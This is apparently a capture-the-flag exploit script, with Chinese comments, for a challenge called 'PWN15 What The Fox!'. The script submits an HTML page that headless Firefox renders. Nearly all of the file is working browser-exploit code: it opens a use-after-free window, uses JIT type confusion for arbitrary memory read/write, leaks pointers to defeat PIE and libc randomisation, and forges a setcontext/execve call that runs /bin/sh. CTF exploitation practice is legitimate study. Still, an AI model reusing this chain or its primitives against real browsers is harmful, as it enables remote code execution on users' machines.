#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PWN15 What The Fox! exploit。

服务协议：连接后打印
    What The Fox?!
    Input one HTML payload; end it with a line containing only EOF.
把整段 HTML 写进 stdin、以单独一行 EOF 结束，服务落盘后用 headless Firefox
打开，Firefox 的 stdout 接回同一条 TCP 连接 —— 页面里的 dump(...) 会逐行回显。

目标：让渲染进程执行 /readflag（/flag 不可读），用
`echo FLAG_START; /readflag; echo FLAG_END` 夹住输出。

页面侧链条（与题解一致，五个 Stage）：
  1) Image 文档：reftest-wait + 内联 PNG 的 data: URL 预热，Blob URL 的
     iframe 触发 image document，readystatechange 里把原生 <img> adopt 到
     隐藏的 contenteditable 文档，再用 SVG <use> 克隆把回放路径接回 JS；
  2) replayPayload()：先跑 JIT 训练，removeAttribute("src") 取消加载，
     同步 XHR 进入嵌套事件循环，让被取消的 proxy 完成异步释放（UAF 窗口）；
  3) JIT 类型混淆：把 double 的位模式当字符串长度压到 8 字节，
     得到可改 data 指针的任意读写；
  4) 泄露 Image/Uint8Array wrapper、native 指针、vptr、backing store，
     反推 PIE（vptr-0xc47abc0）与 libc（read-0x128150）；
  5) 在 backing store 上伪造 setcontext + execve 参数，虚调用踩上去后
     execve("/bin/sh", ["/bin/sh","-c","echo FLAG_START; /readflag; echo FLAG_END"], NULL)。

用法：
    python3 exp.py <host> <port> [--attempts 20] [--timeout 65]
"""

from __future__ import annotations

import argparse
import re
import socket
import sys
import time

PROMPT = b"What The Fox?!"
FLAG = re.compile(rb"(?m)^FLAG_START\r?\n(flag\{[^\r\n}]+\})\s*\r?\n?FLAG_END")

# --------------------------------------------------------------------------- #
# 页面：第一段脚本负责 JIT 类型混淆 + 对象泄露 + 伪造 setcontext
# --------------------------------------------------------------------------- #
PAGE = r"""<html class="reftest-wait"><meta charset="utf-8"><body><script>
function runJIT(){
function f(o,a,b,h1,h2){var k=a+b;h1.w=k;var r=o.hasOwnProperty(k);h2.x=k;return r}
with({}){}
var N=9000,hs1=[],hs2=[];
for(var i=0;i<N;i++){hs1.push({a:i});hs2.push({a:i})}
var objs=[];for(var i=0;i<5;i++){var o={};o['p'+i]=1;objs.push(o)}
var small={abcdefgh1:1,abcdefgh2:2};
window.pressure=function(n){var t=[];for(var i=0;i<n*4096;i++)t.push({q:i});return t.length};
pressure(20);
for(var i=0;i<N;i++){var o=small,b='h1';
 if(i>=600&&i<603)o='primitive';
 else if(i>=6000&&i<6005)o=objs[i-6000];
 else if(i>=6005)b='h2';
 f(o,'abcdefg',b,hs1[i],hs2[i])}
const image=new Image(),view=new Uint8Array(0x200),mem=new ArrayBuffer(8),dv=new DataView(mem);
view.fill(0x41);
function header(len,flags){flags=(flags===undefined)?0x450:flags;
 dv.setUint32(0,flags,true);dv.setUint32(4,len,true);return dv.getFloat64(0,true)}
function ptrDouble(p){dv.setUint32(0,p%4294967296,true);
 dv.setUint32(4,Math.floor(p/4294967296),true);return dv.getFloat64(0,true)}
const slots=["p0","p1","p2","p3","p4"];
let hit=null;window.spray=[];
for(let r=0;r<16&&!hit;r++){
 let arr=[],base=100000+r*30000;
 for(let j=0;j<30000;j++){let h=header(base+j);arr.push({p0:h,p1:h,p2:h,p3:h,p4:h})}
 for(let i=6006;i<N&&!hit;i++){
  let z=hs2[i].x,n=z.length;
  if(n<base||n>=base+30000)continue;
  let j=n-base,o=arr[j];
  for(let k=0;k<4;k++){let old=o[slots[k]];o[slots[k]]=header(8);
   if(z.length===8){hit={i:i,j:j,slot:k};window.spray=arr;break}
   o[slots[k]]=old}}
}
window.AUTO=(hit?"hit="+hit.i+","+hit.j+","+hit.slot:"miss");
if(hit){
 let s=hs2[hit.i].x,o=window.spray[hit.j],hp=slots[hit.slot],dp=slots[hit.slot+1];
 let rb=function(){let b=[];for(let k=0;k<8;k++)b.push(s[k].charCodeAt(0));return b};
 let at=function(p){o[hp]=header(8,0x410);o[dp]=ptrDouble(p);return rb()};
 let pv=function(p){let b=at(p),n=0;for(let k=0;k<6;k++)n+=b[k]*2**(8*k);return n};
 o[hp]=header(8);o[dp]=image;
 let b=rb(),jsobj=0;for(let k=0;k<6;k++)jsobj+=b[k]*2**(8*k);jsobj%=2**47;
 let native=pv(jsobj+24),vptr=pv(native),base=vptr-0xc47abc0;
 let readFn=pv(base+0xc68d5a8),libcBase=readFn-0x128150;
 o[hp]=header(8);o[dp]=view;
 let vb=rb(),vp=0;for(let k=0;k<6;k++)vp+=vb[k]*2**(8*k);vp%=2**47;
 let data=pv(vp+0x30);window.fakeDataPtr=data;
 const tbl=new DataView(view.buffer),libc=BigInt(libcBase);
 const execve=libc+0xf7f00n,setcontext=libc+0x4be80n;
 const B=BigInt(data),stack=B+0x1c8n,path=B+0x100n,arg=B+0x110n;
 const cmd=B+0x120n,argv=B+0x170n;
 view.fill(0,0,0x20);
 view.set(new TextEncoder().encode("/bin/sh\0"),0x100);
 view.set(new TextEncoder().encode("-c\0"),0x110);
 view.set(new TextEncoder().encode("echo FLAG_START; /readflag; echo FLAG_END                       \0"),0x120);
 tbl.setBigUint64(0x170,path,true);tbl.setBigUint64(0x178,arg,true);
 tbl.setBigUint64(0x180,cmd,true);tbl.setBigUint64(0x188,0n,true);
 tbl.setBigUint64(0x190,0n,true);tbl.setBigUint64(0x1c8,0x43434343n,true);
 tbl.setBigUint64(0xa8,setcontext,true);
 window.setcontextData={stack:stack,execve:execve,path:path,argv:argv};
 window.dump("AUTO "+window.AUTO+" PIE="+base.toString(16)+" LIBC="+libcBase.toString(16));
}
window.BLOB_COUNT=0;
}
</script>
<script>
"use strict";
const png="iVBORw0KGgoAAAANSUhEUgAABkAAAAPoAQAAAACuAA8uAAAA2UlEQVR42u3BMQEAAADCoPVP7W8GoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgDcRVQABr+DkXQAAAABJRU5ErkJggg==";
const cachedURL="data:image/png;base64,"+png;
const rawURL=URL.createObjectURL(new Blob([Uint8Array.from(atob(png),c=>c.charCodeAt(0))],{type:"image/png"}));
const preload=new Image();
let imageDocument=null,nativeImage=null,fired=false,hiddenDoc=null;
function finish(){document.documentElement.classList.remove("reftest-wait")}
function replayPayload(){
 if(fired)return;fired=true;
 runJIT();
 nativeImage.removeAttribute("src");
 const xhr=new XMLHttpRequest();
 xhr.open("GET",location.pathname+"?drain="+Math.random(),false);
 xhr.send();
 const ctx=window.setcontextData||null;
 if(ctx){
  for(let r=0;r<100;r++){
   const d=new Uint8Array(0xf0),v=new DataView(d.buffer);
   v.setBigUint64(0x10,ctx.stack,true);
   v.setBigUint64(0x18,ctx.execve,true);
   v.setUint32(0x40,0x1f80,true);
   v.setBigUint64(0x50,BigInt(window.fakeDataPtr),true);
   v.setBigUint64(0x60,BigInt(window.fakeDataPtr),true);
   v.setBigUint64(0xc8,ctx.path,true);
   v.setBigUint64(0xd0,ctx.argv,true);
   window.BLOB_COUNT++;
   void new Blob([d]);
  }
 }
 if(hiddenDoc&&nativeImage)hiddenDoc.body.append(hiddenDoc.adoptNode(nativeImage));
 finish();
}
function armStyleFlush(){
 const ns="http://www.w3.org/2000/svg";
 const svg=document.createElementNS(ns,"svg");
 const defs=document.createElementNS(ns,"defs");
 const g=document.createElementNS(ns,"g");
 g.setAttribute("id","replay-source");
 const sc=document.createElementNS(ns,"script");
 sc.setAttribute("type","application/json");
 sc.textContent="replayPayload()";
 g.appendChild(sc);defs.appendChild(g);svg.appendChild(defs);
 document.body.appendChild(svg);
 sc.setAttribute("type","application/javascript");
 const use=document.createElementNS(ns,"use");
 use.setAttribute("href","#replay-source");
 svg.appendChild(use);
}
function onImageDoc(d){
 if(!d||d.contentType!=="image/png")return;
 const img=d.querySelector("img");
 if(!img)return;
 imageDocument=d;nativeImage=img;
 hiddenDoc.body.append(hiddenDoc.adoptNode(nativeImage));
 nativeImage.src=cachedURL;
 armStyleFlush();
}
window.addEventListener("load",function(){
 preload.src=cachedURL;
 // 隐藏的 about:blank 文档 + contenteditable：让编辑器初始化半途挂起，
 // 之后一次 native 属性更新会重试并 flush 父文档样式
 const hid=document.createElement("iframe");
 hid.style.display="none";
 document.body.appendChild(hid);
 hiddenDoc=hid.contentDocument;
 const ed=hiddenDoc.createElement("div");
 ed.contentEditable="true";
 hiddenDoc.body.appendChild(ed);
 // 图片文档 iframe：Blob URL 的 PNG
 const f=document.createElement("iframe");
 f.style.display="none";
 f.src=rawURL;
 document.body.appendChild(f);
 f.contentWindow.addEventListener("readystatechange",function(){
  const d=f.contentWindow.document;
  if(d&&d.readyState==="interactive")onImageDoc(d);
 },true);
});
</script></body></html>
"""


def attempt(host: str, port: int, timeout: float) -> bytes | None:
    with socket.create_connection((host, port), timeout=20) as sock:
        sock.settimeout(1.0)
        buf = bytearray()
        deadline = time.time() + 20
        while PROMPT not in buf and time.time() < deadline:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                return None
            buf += chunk

        payload = PAGE.encode("utf-8")
        # 必须保证页面里没有单独一行 "EOF"
        for line in payload.split(b"\n"):
            if line.strip() == b"EOF":
                raise RuntimeError("HTML 里出现单独一行 EOF")
        sock.sendall(payload + b"\nEOF\n")

        out = bytearray()
        deadline = time.time() + timeout
        sock.settimeout(1.0)
        while time.time() < deadline:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            out += chunk
            m = FLAG.search(out)
            if m:
                return m.group(1)
    return None


def main() -> None:
    ap = argparse.ArgumentParser(description="PWN15 What The Fox! exploit")
    ap.add_argument("host", help="远端地址（占位，替换为题目下发地址）")
    ap.add_argument("port", type=int, help="远端端口")
    ap.add_argument("--attempts", type=int, default=20)
    ap.add_argument("--timeout", type=float, default=65.0)
    args = ap.parse_args()

    for n in range(1, args.attempts + 1):
        print("[*] attempt %d/%d" % (n, args.attempts))
        try:
            flag = attempt(args.host, args.port, args.timeout)
        except Exception as exc:                       # noqa: BLE001
            print("[!] %r" % (exc,))
            flag = None
        if flag:
            print("[+] FLAG = %s" % flag.decode())
            return
        time.sleep(1.0)
    print("[-] 未取到 flag（浏览器与堆布局有随机性，重连重试即可）")
    sys.exit(1)


if __name__ == "__main__":
    main()
